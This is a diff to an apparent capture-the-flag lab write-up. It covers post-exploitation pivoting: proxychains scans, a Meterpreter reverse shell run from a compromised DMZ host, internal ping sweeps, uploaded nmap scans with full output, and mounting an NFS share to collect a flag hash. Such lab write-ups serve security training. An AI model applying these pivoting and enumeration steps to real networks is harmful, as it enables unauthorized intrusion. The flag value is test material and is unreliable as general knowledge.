@@ -363,14 +363,104 @@ We can also test if proxychains is working by testing a proxychains nmap scan, b
 proxychains nmap -sT -Pn (ip)
 ```
 After verifying proxychains is working, we create a new shell.elf file but this time making the local port 9050, which is the port for the proxychains servers. We then use multi/handler to create a TCP listener on msfconsole and execute the shell.elf file on DMZ1. After getting meterpreter, we background the session and use multi/gather/ping_sweep and use the subnet 172.16.0.0/16 172.17.0.0/16 172.18.0.0/16 as the RHOSTS as well as set the meterpreter session number. 
-We then run the ping sweep and wait patiently for it to return hosts:
+We then run the ping sweep and wait a while for it to return hosts:
 ```
 [*] Performing ping sweep for IP range 172.16.0.0/16
 [+] 	172.16.8.3 host found
 [+] 	172.16.8.20 host found
 [+] 	172.16.8.50 host found
 [+] 	172.16.8.120 host found
-```
 
+[*] Performing ping sweep for IP range 172.17.0.0/16
+[+] 	172.17.0.2 host found
+[+] 	172.17.0.1 host found
+
+[*] Performing ping sweep for IP range 172.18.0.0/16
+[+] 	172.18.0.3 host found
+[+] 	172.18.0.8 host found
+[+] 	172.18.0.7 host found
+[+] 	172.18.0.6 host found
+[+] 	172.18.0.5 host found
+[+] 	172.18.0.2 host found
+[+] 	172.18.0.9 host found
+[+] 	172.18.0.4 host found
+[+] 	172.18.0.1 host found
+[+] 	172.18.0.10 host found
+[+] 	172.18.0.11 host found
+[+] 	172.18.0.12 host found
+
+[*] Performing ping sweep for IP range 10.129.0.0/16
+[+] 	10.129.0.1 host found
+[+] 	10.129.1.43 host found
+[+] 	10.129.1.168 host found
+[+] 	10.129.2.47 host found
+[+] 	10.129.2.48 host found
+[+] 	10.129.2.80 host found
+[+] 	10.129.2.219 host found
+[+] 	10.129.3.171 host found
+
+```
+After finding all these hosts, we create a text file containing all of these ip addresses and then use the nmap command with -iL to enumerate all of these hosts.
+```
+sudo proxychains nmap -sT -Pn -iL nmaphosts.txt (ip)
+```
+I then upload the static nmap binary and the list of hosts text file to DMZ01 and then nmap scan on DMZ01. 
+```
+./nmap --open -iL live_hosts 
+
+SYN Stealth Scan Timing: About 100.00% done; ETC: 19:48 (0:00:00 remaining)
+Nmap scan report for 172.16.8.3
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00046s latency).
+Not shown: 1173 closed ports
+PORT    STATE SERVICE
+53/tcp  open  domain
+88/tcp  open  kerberos
+135/tcp open  epmap
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
+464/tcp open  kpasswd
+593/tcp open  unknown
+636/tcp open  ldaps
+MAC Address: 00:50:56:B0:0D:49 (Unknown)
+
+Nmap scan report for 172.16.8.20
+Host is up (0.00037s latency).
+Not shown: 1175 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+111/tcp  open  sunrpc
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+3389/tcp open  ms-wbt-server
+MAC Address: 00:50:56:B0:51:4C (Unknown)
+
+Nmap scan report for 172.16.8.50
+Host is up (0.00055s latency).
+Not shown: 1177 closed ports
+PORT     STATE SERVICE
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-alt
+MAC Address: 00:50:56:B0:48:B7 (Unknown)
+```
+We see that 172.16.8.3 is most likely the domain controller because we see Kerberos and LDAP as open ports. 
+For 172.16.8.20, we are interested in the HTTP service port 80 as well as the NFS service on port 2049.
+For 172.16.8.50, we are interested in the HTTP service on port 8080.
+
+We use the following commands to attempt to mount the NFS share from 172.16.8.20:
+```
+mkdir target-NFS
+sudo mount -t NFS (ip):/ ./target-NFS -o nolock
+cd target-NFS
+```
+Then we see the DEV01 share that has a flag.txt file and finally we find the Fourteenth Flag: bf22a1d0acfca4af517e1417a80e92d1.
+
+### Fifteenth Flag:
 
 
